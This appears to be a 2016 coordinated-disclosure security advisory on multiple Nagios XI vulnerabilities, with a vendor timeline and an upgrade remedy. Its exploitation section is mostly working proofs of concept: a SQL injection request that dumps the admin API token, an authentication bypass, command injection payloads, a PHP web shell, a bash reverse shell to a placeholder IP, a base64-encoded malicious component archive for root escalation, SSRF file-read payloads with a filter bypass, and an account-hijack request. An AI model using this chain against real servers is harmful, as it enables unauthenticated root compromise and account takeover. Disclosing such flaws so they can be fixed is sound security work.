@@ -1,0 +1,268 @@
+(    , )     (,
+  .   '.' ) ('.    ',
+   ). , ('.   ( ) (
+  (_,) .'), ) _ _,
+ /  _____/  / _  \    ____  ____   _____
+ \____  \==/ /_\  \ _/ ___\/  _ \ /     \
+ /       \/   |    \\  \__(  <_> )  Y Y  \
+/______  /\___|__  / \___  >____/|__|_|  /
+        \/         \/.-.    \/         \/:wq
+                    (x.0)
+                  '=.|w|.='
+                  _=''"''=.
+
+                presents..
+
+Nagios XI Multiple Vulnerabilities
+Affected versions: Nagios XI <= 5.2.7
+
+PDF:
+http://www.security-assessment.com/files/documents/advisory/NagiosXI-Advisory.pdf
+
++-----------+
+|Description|
++-----------+
+The Nagios XI application is affected by multiple security
+vulnerabilities, including unauthenticated SQL injection and
+authentication bypass, arbitrary code execution via command injection,
+privilege escalation, server-side request forgery and account hijacking.
+
+These vulnerabilities can be chained together to obtain unauthenticated
+remote code execution as the root user.
+
++------------+
+|Exploitation|
++------------+
+==SQL Injection==
+The ‘host’ and ‘service’ GET parameters in the ‘nagiosim.php’ page are
+vulnerable to SQL injection via error-based payloads. An attacker can
+exploit this vulnerability to retrieve sensitive information from the
+application’s MySQL database such as the administrative users’ password
+hash (unsalted MD5) or the token used to authenticate to the Nagios XI
+REST API. This security issue is aggravated by the fact that an attacker
+can directly browse to the vulnerable page and exploit the vulnerability
+without providing a valid session cookie.
+
+[POC - DUMP ADMIN API TOKEN]
+GET
+/nagiosxi/includes/components/nagiosim/nagiosim.php?mode=resolve&host=a&service='+AND+
+(SELECT+1+FROM(SELECT+COUNT(*),CONCAT('|APIKEY|',(SELECT+MID((IFNULL(CAST(backend_ticket+AS
++CHAR),0x20)),1,54)+FROM+xi_users+WHERE+user_id%3d1+LIMIT+0,1),'|APIKEY|',FLOOR(RAND(0)*2))
+x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)+OR+' HTTP/1.1
+
+The API token can be reused to bypass authentication either by creating
+a user via the REST API or through the Rapid Response functionality as
+shown below.
+
+[POC- BYPASS AUTHENTICATION THROUGH RAPID RESPONSE FUNCTIONALITY]
+// uid == <user_id>-<object_id>-<MD5(api token)>, object id value
+doesn't matter
+GET /nagiosxi/rr.php?uid=1-b-<hash> HTTP/1.1
+
+==Command Injection==
+Multiple command injection vulnerabilities exist in the Nagios XI web
+interface due to unescaped user input being passed to shell functions as
+an argument. This issues can be exploited to inject arbitrary shell
+commands and obtain remote code execution in the context of the 'apache'
+user.
+
+URL         => GET
+/nagiosxi/includes/components/nagiosim/nagiosim.php?mode=update&token=<api
+token>&incident_id=<valid incident id>&title=<PAYLOAD>&status=<any value>
+PARAMETER   => title
+POC PAYLOAD => title'; touch /tmp/FILE; echo '
+
+URL         => GET
+/nagiosxi/includes/components/perfdata/graphApi.php?host=<any monitored
+host IP>&start=<PAYLOAD>&end=<PAYLOAD>
+PARAMETERS  => start, end
+POC PAYLOAD => 1; touch /tmp/FILE;
+
+==Privilege Escalation==
+The Nagios XI default sudoers configuration can be abused to elevate
+privileges to root due to an insecure implementation of the
+application’s component upload functionality. The ‘apache’ user can run
+the getprofile.sh script with root privileges without being prompted for
+a password. The getprofile.sh script is part of the Profile component
+along with the following files:
+
+- profile.php, the PHP script that outputs the system information.
+- profile.inc.php, a PHP include file with required functionality for
+profile.php.
+
+An attacker can backdoor the profile.php file with a function to execute
+arbitrary shell commands (e.g. <?php system($_GET['cmd']); ?> ), replace
+the getprofile.sh file with a malicious payload (e.g. “#!/bin/bash bash
+–i >& /dev/tcp/<IP>/<PORT> 0>&1”) and finally create a ‘profile.zip’
+archive containing the malicious component files. Once uploaded, the
+application will unzip the component archive and overwrite the existing
+profile directory and its files, including getprofile.sh.
+
+[POC - MALICIOUS 'profile.zip' COMPONENT ARCHIVE]
+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
+vREAAAAA
+  
+[POC - PRIVILEGE ESCALATION EXPLOITATION]
+GET /nagiosxi/includes/components/profile/profile.php?cmd=sudo
+./getprofile.sh
+
+The default Profile component archive can be downloaded at the following
+link:
+https://assets.nagios.com/downloads/nagiosxi/components/profile.zip
+
+==Server-Side Request Forgery==
+Multiple server-side request forgery vulnerabilities exist in the Nagios
+XI application. An attacker can provide arbitrary data to curl_exec
+calls to port scan internal services listening on localhost, read files
+on the Nagios XI server file system or send data to other hosts in the
+same internal network where the Nagios XI server is deployed.
+
+// the application filter the string 'file://' can be bypassed by
+converting the handler to uppercase
+URL         => GET /nagiosxi/ajaxproxy.php?proxyurl=<PAYLOAD>
+PARAMETER   => proxyurl
+POC PAYLOAD => FILE:///<path>/<file>
+
+URL         => GET /nagiosxi/backend/?cmd=geturlhtml&url=<PAYLOAD>
+PARAMETER   => url
+POC PAYLOAD => file:///<path>/<file>
+
+==Account Hijacking==
+The Nagios XI application is vulnerable to an arbitrary account
+hijacking vulnerability due to an insecure implementation of the
+password reset functionality. The application does not enforce any
+verification to confirm the provided reset token can only be used to
+change the login credentials for the specific user for which it was
+generated. A limited user can therefore abuse the password reset
+functionality to hijack an administrative account by tampering with the
+‘username’ hidden parameter during the password reset process.
+
+[POC - ACCOUNT HIJACKING 'nagiosadmin']
+POST /nagiosxi/login.php?finishresetpass&username=stduser&token-<reset
+token> HTTP/1.1
+
+token=<reset
+token>&username=nagiosadmin&password1=<PASSWORD>&password2=<PASSWORD>&reset=1
+
++----------+
+| Solution |
++----------+
+Upgrade to Nagios XI 5.2.8.
+
+Please note at the time of this writing the privilege escalation
+vulnerability is still unpatched. The SSRF vulnerabilities have been
+only partially fixed by blacklisting the 'file://' handler, but all the
+other SSRF attack vectors are still exploitable. Vendor stated these
+vulnerabilities will be likely patched on the next release of the
+application as they require authentication and as such are not
+considered major security issues.
+
++------------+
+|  Timeline  |
++------------+
+13/05/2016 – Initial disclosure to vendor
+14/05/2016 – Vendor confirms receipt of advisory
+25/05/2016 – Vendor provides fixes for most of the vulnerabilities
+25/05/2016 – Enquiry about the status of fixes for the unpatched
+vulnerabilities
+26/05/2016 – Vendor responded with “Since the major issues have been
+fixed and the remaining issues I'd like to touch up are only available
+if the user is logged in, or logged in as admin, I don't see a reason to
+hold onto releasing the advisory.”
+2/06/2016 – Public disclosure
+
++------------+
+| Additional |
++------------+
+Further information is available in the accompanying PDF.
+http://www.security-assessment.com/files/documents/advisory/NagiosXI-Advisory.pdf
